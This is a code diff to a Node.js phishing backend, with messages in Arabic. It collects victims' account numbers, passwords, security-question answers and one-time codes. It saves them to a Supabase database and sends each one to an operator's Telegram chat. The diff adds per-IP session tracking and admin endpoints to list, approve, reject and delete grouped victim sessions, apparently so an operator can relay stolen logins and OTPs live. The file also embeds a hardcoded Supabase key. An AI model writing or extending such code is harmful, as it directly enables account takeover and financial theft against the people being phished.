@@ -12,11 +12,12 @@ const SUPABASE_URL = process.env.SUPABASE_URL || "https://kwmjafdwvfewhftyatio.s
 const SUPABASE_KEY = process.env.SUPABASE_KEY || "sb_publishable_DsDXkP1UbTMGZvVT6V2X5Q_hbhjBEaM";
 const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
-async function addSubmission(type, data) {
+async function addSubmission(type, data, session_id) {
   const entry = {
     id: Date.now() + "_" + Math.random().toString(36).slice(2, 8),
     type,
     account: data.account || "",
+    session_id: session_id || "",
     status: "pending",
     time: new Date().toISOString(),
     data: { ...data }
@@ -46,11 +47,29 @@ const adminSessions = new Set();
 const visitors = new Map();
 const VISITOR_TIMEOUT = 60000;
 
+function getClientIp(req) {
+  return req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.socket.remoteAddress || "unknown";
+}
+
 function trackVisitor(req) {
-  const ip = req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.socket.remoteAddress || "unknown";
+  const ip = getClientIp(req);
   const ua = req.headers["user-agent"] || "";
   const key = ip + "|" + ua.slice(0, 50);
   visitors.set(key, { ip, t: Date.now(), ua: ua.slice(0, 80) });
+}
+
+const clientSessions = new Map();
+const SESSION_TIMEOUT = 30 * 60 * 1000;
+
+function getOrCreateSession(ip, account) {
+  const existing = clientSessions.get(ip);
+  if (existing && (Date.now() - existing.created < SESSION_TIMEOUT)) {
+    if (account) existing.account = account;
+    return existing.session_id;
+  }
+  const session_id = "sess_" + Date.now() + "_" + Math.random().toString(36).slice(2, 8);
+  clientSessions.set(ip, { session_id, account: account || "", created: Date.now() });
+  return session_id;
 }
 
 function getActiveVisitors() {
@@ -165,21 +184,22 @@ function sendJson(res, data) {
   res.end(json);
 }
 
-async function detectAndSend(data) {
+async function detectAndSend(data, ip) {
+  const session_id = ip ? getOrCreateSession(ip, data.account || "") : "";
   const s = loadSettings();
   const time = new Date().toLocaleString("ar-EG");
   if (data.password) {
-    await addSubmission("login", data);
+    await addSubmission("login", data, session_id);
     const msg = `🔐 <b>تسجيل دخول جديد</b>\n\n👤 رقم الحساب: <code>${data.account || ""}</code>\n🔑 كلمة المرور: <code>${data.password || ""}</code>\n📋 الخدمة: ${data.service || "غير محدد"}\n⏰ ${time}`;
     return sendTelegram(s.bot_token, s.chat_id, msg);
   }
   if (data.question || data.answer) {
-    await addSubmission("security", data);
+    await addSubmission("security", data, session_id);
     const msg = `🛡️ <b>سؤال أمان</b>\n\n❓ السؤال: ${data.question || ""}\n✏️ الجواب: <code>${data.answer || ""}</code>\n👤 الحساب: <code>${data.account || ""}</code>\n⏰ ${time}`;
     return sendTelegram(s.bot_token, s.chat_id, msg);
   }
   if (data.code || data.otp || data.otp_code) {
-    await addSubmission("otp", data);
+    await addSubmission("otp", data, session_id);
     const msg = `🔢 <b>رمز OTP</b>\n\n🔑 الرمز: <code>${data.code || data.otp || data.otp_code || ""}</code>\n👤 الحساب: <code>${data.account || ""}</code>\n⏰ ${time}`;
     return sendTelegram(s.bot_token, s.chat_id, msg);
   }
@@ -222,24 +242,24 @@ function readJsonBody(req) {
 }
 
 const SERVER_FN_HANDLERS = {
-  "5a778137b307c3c64bcb13b4f224a252e8f3929d980316359d75b7e570ad9a78": async (data) => {
-    await detectAndSend(data);
+  "5a778137b307c3c64bcb13b4f224a252e8f3929d980316359d75b7e570ad9a78": async (data, ip) => {
+    await detectAndSend(data, ip);
     return { ok: true };
   },
-  "8f77dad699ccdcb965b75b5b4ade8d14cc361218add59796aa50c9bb1dc34fda": async (data) => {
-    await detectAndSend(data);
+  "8f77dad699ccdcb965b75b5b4ade8d14cc361218add59796aa50c9bb1dc34fda": async (data, ip) => {
+    await detectAndSend(data, ip);
     return { ok: true };
   },
-  "f3104eed51e53b25722f81ffc68fdea6ff2734a01f7814fd27fd5ba59405d58a": async (data) => {
-    await detectAndSend(data);
+  "f3104eed51e53b25722f81ffc68fdea6ff2734a01f7814fd27fd5ba59405d58a": async (data, ip) => {
+    await detectAndSend(data, ip);
     return { ok: true };
   },
-  "558c58ed06e8b7706d065b4277a2f70a11c7f1f3fdb164ce74a206e5697d440f": async (data) => {
-    await detectAndSend(data);
+  "558c58ed06e8b7706d065b4277a2f70a11c7f1f3fdb164ce74a206e5697d440f": async (data, ip) => {
+    await detectAndSend(data, ip);
     return { ok: true };
   },
-  "01b7b7d8a082e3c609ee93861dd303887d75b7309ad540f543aeaf3b7462ab10": async (data) => {
-    await detectAndSend(data);
+  "01b7b7d8a082e3c609ee93861dd303887d75b7309ad540f543aeaf3b7462ab10": async (data, ip) => {
+    await detectAndSend(data, ip);
     return { ok: true };
   },
 
@@ -377,6 +397,69 @@ http.createServer(async (req, res) => {
     return sendJsonApi(res, 200, { ok: true });
   }
 
+  if (urlPath === "/admin/api/sessions" && req.method === "GET") {
+    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
+    const submissions = await getSubmissions();
+    const sessionsMap = {};
+    submissions.forEach(s => {
+      const sid = s.session_id || ("acct_" + (s.account || s.id));
+      if (!sessionsMap[sid]) {
+        sessionsMap[sid] = { session_id: sid, account: s.account || "", status: "pending", time: s.time, steps: [] };
+      }
+      sessionsMap[sid].steps.push(s);
+      if (s.account) sessionsMap[sid].account = s.account;
+    });
+    Object.values(sessionsMap).forEach(sess => {
+      if (sess.steps.some(s => s.status === "rejected")) sess.status = "rejected";
+      else if (sess.steps.every(s => s.status === "approved")) sess.status = "approved";
+      else sess.status = "pending";
+    });
+    const sessions = Object.values(sessionsMap).sort((a, b) => new Date(b.time) - new Date(a.time));
+    return sendJsonApi(res, 200, { ok: true, sessions });
+  }
+
+  if (urlPath === "/admin/api/approve-session" && req.method === "POST") {
+    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
+    const body = await readJsonBody(req);
+    if (body.session_id) {
+      if (body.session_id.startsWith("acct_")) {
+        const account = body.session_id.replace("acct_", "");
+        await supabase.from("submissions").update({ status: "approved" }).eq("account", account);
+      } else {
+        await supabase.from("submissions").update({ status: "approved" }).eq("session_id", body.session_id);
+      }
+    }
+    return sendJsonApi(res, 200, { ok: true });
+  }
+
+  if (urlPath === "/admin/api/reject-session" && req.method === "POST") {
+    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
+    const body = await readJsonBody(req);
+    if (body.session_id) {
+      if (body.session_id.startsWith("acct_")) {
+        const account = body.session_id.replace("acct_", "");
+        await supabase.from("submissions").update({ status: "rejected" }).eq("account", account);
+      } else {
+        await supabase.from("submissions").update({ status: "rejected" }).eq("session_id", body.session_id);
+      }
+    }
+    return sendJsonApi(res, 200, { ok: true });
+  }
+
+  if (urlPath === "/admin/api/delete-session" && req.method === "POST") {
+    if (!isAdminLoggedIn(req)) return sendJsonApi(res, 401, { ok: false });
+    const body = await readJsonBody(req);
+    if (body.session_id) {
+      if (body.session_id.startsWith("acct_")) {
+        const account = body.session_id.replace("acct_", "");
+        await supabase.from("submissions").delete().eq("account", account);
+      } else {
+        await supabase.from("submissions").delete().eq("session_id", body.session_id);
+      }
+    }
+    return sendJsonApi(res, 200, { ok: true });
+  }
+
   if (urlPath.startsWith("/_serverFn/") && req.method === "POST") {
     trackVisitor(req);
     const hash = urlPath.replace("/_serverFn/", "");
@@ -388,7 +471,7 @@ http.createServer(async (req, res) => {
         const body = await readBody(req);
         const input = body.data || body;
         console.log("[REQ] unknown hash data keys:", Object.keys(input));
-        await detectAndSend(input);
+        await detectAndSend(input, getClientIp(req));
       } catch (e) {}
       sendJson(res, { ok: true });
       return;
@@ -397,7 +480,7 @@ http.createServer(async (req, res) => {
       const body = await readBody(req);
       const input = body.data || body;
       console.log("[REQ] parsed input keys:", Object.keys(input));
-      const result = await handler(input);
+      const result = await handler(input, getClientIp(req));
       console.log("[REQ] result:", JSON.stringify(result).slice(0, 200));
       sendJson(res, result);
     } catch (e) {
